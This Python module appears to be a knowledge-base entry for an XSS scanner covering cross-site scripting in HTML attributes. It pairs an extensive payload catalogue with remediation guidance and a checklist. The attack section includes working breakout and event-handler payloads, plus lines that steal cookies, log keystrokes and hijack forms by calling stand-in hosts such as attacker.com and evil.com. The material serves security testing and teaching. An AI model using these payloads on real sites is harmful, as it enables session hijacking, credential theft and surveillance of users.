#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Modified
Telegram: https://t.me/easyprotech

Knowledge Base: HTML Attribute Context - Guide
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) in HTML Attribute",
    
    "description": """
User input is reflected inside an HTML tag's attribute without proper escaping. This is one of the most 
common XSS vectors in modern web applications. Attackers can break out of the attribute context to inject 
event handlers, create new attributes, or even close the tag entirely to inject arbitrary HTML.

VULNERABILITY CONTEXT:
HTML attributes can contain user data in various contexts:
- value="USER_INPUT" in form fields
- href="USER_INPUT" in links
- src="USER_INPUT" in images/scripts
- alt="USER_INPUT" in images
- title="USER_INPUT" in tooltips
- data-*="USER_INPUT" in custom attributes
- style="USER_INPUT" in inline styles
- onclick="USER_INPUT" in event handlers
- class="USER_INPUT" in CSS classes
- id="USER_INPUT" in element IDs

Special risk exists with attributes that can execute JavaScript:
- href, src, action, formaction (URL attributes)
- All event handlers (onclick, onload, onerror, etc.)
- style (can contain expression() or url())
- srcdoc in iframes

SEVERITY: HIGH to CRITICAL
Depends on the specific attribute and quoting style. Unquoted attributes are most dangerous.
""",

    "attack_vector": """
BREAKING OUT OF QUOTED ATTRIBUTES:

1. DOUBLE QUOTES:
   Input in: <input value="USER_INPUT">
   
   Basic breakout:
   " onload=alert(1) x="
   Result: <input value="" onload=alert(1) x="">
   
   Autofocus technique:
   " onfocus=alert(1) autofocus x="
   Result: <input value="" onfocus=alert(1) autofocus x="">
   
   Multiple events:
   " onmouseover=alert(1) onfocus=alert(1) autofocus x="

2. SINGLE QUOTES:
   Input in: <input value='USER_INPUT'>
   
   Basic breakout:
   ' onload=alert(1) x='
   Result: <input value='' onload=alert(1) x=''>
   
   With encoding:
   &#39; onload=alert(1) x=&#39;
   
3. UNQUOTED ATTRIBUTES (Most Dangerous):
   Input in: <input value=USER_INPUT>
   
   Direct injection (no quote needed):
   x onload=alert(1)
   Result: <input value=x onload=alert(1)>
   
   Alternative events:
   x onfocus=alert(1) autofocus
   x onmouseover=alert(1)
   x onclick=alert(1)

4. CLOSING TAG:
   Input in: <div title="USER_INPUT">
   
   Close tag and inject new content:
   "><script>alert(1)</script><div x="
   Result: <div title=""><script>alert(1)</script><div x="">

EVENT HANDLER INJECTION TECHNIQUES:

5. AUTOFOCUS EVENTS (No user interaction):
   " onfocus=alert(1) autofocus "
   " onfocus=alert(document.domain) autofocus "
   ' onfocus=alert`1` autofocus '

6. ACCESSKEY (Social engineering):
   " accesskey=x onclick=alert(1) "
   (User presses Alt+X or Alt+Shift+X)
   
   " accesskey=a onclick=alert(1) title="Press Alt+A to continue" "

7. MODERN EVENT HANDLERS:
   
   Pointer events:
   " onpointerrawupdate=alert(1) "
   " onpointerover=alert(1) "
   " onpointerenter=alert(1) "
   
   Auxiliary click:
   " onauxclick=alert(1) "
   (Triggered by middle mouse button)
   
   Toggle:
   " ontoggle=alert(1) "
   (For <details> elements)
   
   Animation events:
   " onanimationstart=alert(1) style=animation-name:x "
   " onanimationend=alert(1) style=animation:x+1s "
   
   Transition events:
   " ontransitionend=alert(1) style=transition:all+1s "

8. SVG/XML EVENT HANDLERS:
   " onbegin=alert(1) " (SVG animations)
   " onend=alert(1) " (SVG animations)
   " onrepeat=alert(1) " (SVG animations)

9. MUTATION EVENTS (Deprecated but still work):
   " onDOMActivate=alert(1) "
   " onDOMFocusIn=alert(1) "
   " onDOMSubtreeModified=alert(1) "

10. FORM-RELATED EVENTS:
    " oninput=alert(1) "
    " onchange=alert(1) "
    " oninvalid=alert(1) "
    " onsubmit=alert(1) "
    " onreset=alert(1) "

URL ATTRIBUTE EXPLOITATION:

11. HREF ATTRIBUTE:
    <a href="USER_INPUT">Click</a>
    
    JavaScript protocol:
    javascript:alert(1)
    javascript:eval(atob('YWxlcnQoMSk='))
    javascript:fetch('//evil.com?c='+document.cookie)
    
    Data URLs:
    data:text/html,<script>alert(1)</script>
    data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
    
    With encoding bypasses:
    jav&#x09;ascript:alert(1)
    jav&#x0A;ascript:alert(1)
    &#106;avascript:alert(1)

12. SRC ATTRIBUTE:
    <img src="USER_INPUT">
    <script src="USER_INPUT">
    <iframe src="USER_INPUT">
    
    JavaScript protocol:
    javascript:alert(1)
    
    Data URLs:
    data:text/html,<script>alert(1)</script>
    
    External malicious script:
    //evil.com/xss.js
    https://evil.com/xss.js

13. FORMACTION ATTRIBUTE (HTML5):
    <button formaction="USER_INPUT">
    <input type="submit" formaction="USER_INPUT">
    
    Hijack form submission:
    javascript:alert(1)
    //evil.com/steal

14. ACTION ATTRIBUTE:
    <form action="USER_INPUT">
    
    Redirect form data:
    javascript:alert(1)
    //evil.com/phish

BYPASSES AND TECHNIQUES:

15. HTML5 DATA ATTRIBUTES:
    If JavaScript processes data-* attributes:
    <div data-config="USER_INPUT">
    
    Payload:
    {"exec":"alert(1)"}
    </div><script>alert(1)</script><div x="

16. ARIA ATTRIBUTES:
    " aria-label="x" onfocus="alert(1)" autofocus x="
    " aria-describedby="x" onmouseover="alert(1)" x="

17. STYLE ATTRIBUTE:
    <div style="USER_INPUT">
    
    Expression (IE):
    expression(alert(1))
    
    Background with JavaScript (legacy):
    background:url(javascript:alert(1))
    
    Import:
    @import'javascript:alert(1)';
    
    Breaking out:
    " onload=alert(1) x="

18. CLASS ATTRIBUTE EXPLOITATION:
    If CSS has dangerous selectors:
    <div class="USER_INPUT">
    
    Payload:
    " onload=alert(1) x="
    
    Or exploit CSS injection if class affects styles

19. TITLE ATTRIBUTE:
    <div title="USER_INPUT">
    
    Break out:
    " onmouseover=alert(1) x="
    " onclick=alert(1) x="

20. CONTENTEDITABLE WITH EVENTS:
    " contenteditable onfocus=alert(1) autofocus x="

ENCODING BYPASSES:

21. HTML ENTITY ENCODING:
    &#34; = "
    &#39; = '
    &#x22; = "
    &#x27; = '
    
    Payload:
    &#34; onfocus=alert(1) autofocus x=&#34;

22. URL ENCODING:
    %22 = "
    %27 = '
    %3C = <
    %3E = >
    
    In href:
    javascript:alert%281%29

23. UNICODE ESCAPES:
    \\u0022 = "
    \\u0027 = '
    
    In JavaScript contexts:
    " onclick="alert(\\u0031)" "

24. NULL BYTES:
    "%00 onfocus=alert(1) autofocus x=
    Some parsers stop at null byte

25. NEWLINES AND TABS:
    "\\n onfocus=alert(1) autofocus x="
    "\\t onfocus=alert(1) autofocus x="

REAL-WORLD ATTACK SCENARIOS:

STORED XSS VIA PROFILE:
User enters in "Website" field:
" onfocus=alert(document.cookie) autofocus x="

Rendered as:
<input type="url" value="" onfocus=alert(document.cookie) autofocus x="">

SESSION HIJACKING:
" onfocus="fetch('//attacker.com?c='+btoa(document.cookie))" autofocus x="

KEYLOGGER:
" onfocus="document.onkeypress=function(e){fetch('//attacker.com?k='+e.key)}" autofocus x="

FORM HIJACKING:
<button formaction="USER_INPUT">Update Profile</button>

Payload:
javascript:fetch('//evil.com/steal',{method:'POST',body:new FormData(this.form)})

CREDENTIAL THEFT:
<a href="USER_INPUT">Reset Password</a>

Payload:
javascript:document.body.innerHTML='<form action=//evil.com/phish><input name=user placeholder=Username><input name=pass type=password placeholder=Password><button>Login</button></form>'

CLICKJACKING:
" style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0;cursor:pointer" onclick="fetch('//evil.com/click')" x="

CONTEXT-SPECIFIC ATTACKS:

SVG href:
<svg><use href="USER_INPUT">

Payload:
data:image/svg+xml,<svg id=x onload=alert(1)>

Meta refresh:
<meta http-equiv="refresh" content="0; url=USER_INPUT">

Payload:
javascript:alert(1)

Link prefetch:
<link rel="prefetch" href="USER_INPUT">

Payload:
//evil.com/track
""",

    "remediation": """
DEFENSE-IN-DEPTH STRATEGY:

1. ATTRIBUTE-SPECIFIC ENCODING:
   
   For general attributes (value, title, alt, etc.):
   - Encode: & < > " '
   - To: &amp; &lt; &gt; &quot; &#x27;
   
   Python:
   import html
   safe = html.escape(user_input, quote=True)
   
   PHP:
   $safe = htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
   
   JavaScript:
   function escapeAttr(text) {
     return text
       .replace(/&/g, '&amp;')
       .replace(/</g, '&lt;')
       .replace(/>/g, '&gt;')
       .replace(/"/g, '&quot;')
       .replace(/'/g, '&#x27;');
   }

2. ALWAYS USE QUOTES:
   
   BAD (Unquoted):
   <input value=<?php echo $user_input ?>>
   
   GOOD (Double quoted):
   <input value="<?php echo htmlspecialchars($user_input, ENT_QUOTES) ?>">
   
   PREFER DOUBLE QUOTES over single quotes (consistency)

3. URL ATTRIBUTE VALIDATION:
   
   For href, src, action, formaction:
   
   Whitelist protocols:
   allowed = ['http://', 'https://', 'mailto:', 'tel:']
   
   Python:
   from urllib.parse import urlparse
   
   def is_safe_url(url):
       if not url:
           return False
       parsed = urlparse(url)
       return parsed.scheme in ['http', 'https', 'mailto', 'tel']
   
   if not is_safe_url(user_url):
       raise ValueError('Invalid URL')
   
   JavaScript:
   function isSafeURL(url) {
       try {
           const parsed = new URL(url, window.location.href);
           return ['http:', 'https:', 'mailto:', 'tel:'].includes(parsed.protocol);
       } catch {
           return false;
       }
   }

4. NEVER PLACE USER INPUT IN EVENT HANDLERS:
   
   BAD:
   <div onclick="<?php echo $user_input ?>">
   <button onclick="doSomething('<?php echo $user_input ?>')">
   
   GOOD:
   Use data attributes + addEventListener:
   <button id="myBtn" data-value="<?php echo htmlspecialchars($user_input) ?>">
   
   <script>
   document.getElementById('myBtn').addEventListener('click', function() {
       const value = this.dataset.value; // Safe
       doSomething(value);
   });
   </script>

5. CONTENT SECURITY POLICY:
   
   Restrict inline event handlers:
   Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'
   
   This blocks all inline event handlers (onclick, onload, etc.)

6. FRAMEWORK AUTO-ESCAPING:
   
   React (Safe for attributes):
   <input value={userInput} /> {/* Auto-escaped */}
   <a href={userHref}>{/* React validates URL */}</a>
   
   Vue:
   <input :value="userInput"> <!-- Auto-escaped -->
   <a :href="userHref"> <!-- Sanitized -->
   
   Angular:
   <input [value]="userInput"> <!-- Auto-escaped -->
   <a [href]="userHref"> <!-- Sanitized by DomSanitizer -->
   
   DANGEROUS:
   <div [attr.onclick]="userInput"> <!-- Don't do this -->

7. VALIDATE INPUT BEFORE OUTPUT:
   
   For expected formats:
   
   Email:
   /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/
   
   Phone:
   /^\\+?[0-9\\s\\-\\(\\)]{10,20}$/
   
   Username:
   /^[a-zA-Z0-9_-]{3,20}$/
   
   URL (basic):
   /^https?:\\/\\/.+/

8. USE SAFE APIS:
   
   Setting attributes safely:
   
   GOOD:
   element.setAttribute('title', userInput); // Auto-escaped
   element.dataset.value = userInput; // Safe
   element.value = userInput; // Safe for form inputs
   
   BAD:
   element.innerHTML = '<div title="' + userInput + '">'; // Dangerous
   element.outerHTML = userInput; // Dangerous

9. SANITIZE URLS:
   
   For href/src attributes:
   
   import { URL } from 'url';
   
   function sanitizeURL(url) {
       try {
           const parsed = new URL(url);
           if (!['http:', 'https:', 'mailto:', 'tel:'].includes(parsed.protocol)) {
               return '#'; // Safe fallback
           }
           return url;
       } catch {
           return '#'; // Invalid URL
       }
   }

10. HTTPONLY COOKIES:
    
    Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
    
    Prevents JavaScript access even if XSS exists

SECURITY CHECKLIST:

[ ] All attributes use proper HTML encoding
[ ] All attributes are quoted (prefer double quotes)
[ ] URL attributes validated against protocol whitelist
[ ] No user input in event handler attributes
[ ] No user input in style attributes
[ ] Use data-* attributes + JavaScript instead of inline handlers
[ ] CSP configured to block inline event handlers
[ ] Framework auto-escaping enabled (not bypassed)
[ ] Input validation for expected formats
[ ] URL sanitization for href/src/action
[ ] HTTPOnly flag on session cookies
[ ] Regular security testing
[ ] Code review for all attribute usage
[ ] Use setAttribute() API, not string concatenation

TESTING PAYLOADS:

Basic breakout (double quotes):
" onfocus=alert(1) autofocus x="

Basic breakout (single quotes):
' onfocus=alert(1) autofocus x='

Unquoted:
x onfocus=alert(1) autofocus

URL injection:
javascript:alert(1)
data:text/html,<script>alert(1)</script>

Tag closing:
"><script>alert(1)</script><x x="

Encoding bypass:
&#34; onfocus=alert(1) autofocus x=&#34;

OWASP REFERENCES:
- OWASP XSS Prevention Cheat Sheet: Rule #2
- CWE-79: Improper Neutralization of Input During Web Page Generation
- OWASP Testing Guide: Testing for Reflected XSS
- HTML5 Security Cheatsheet: https://html5sec.org
"""
}
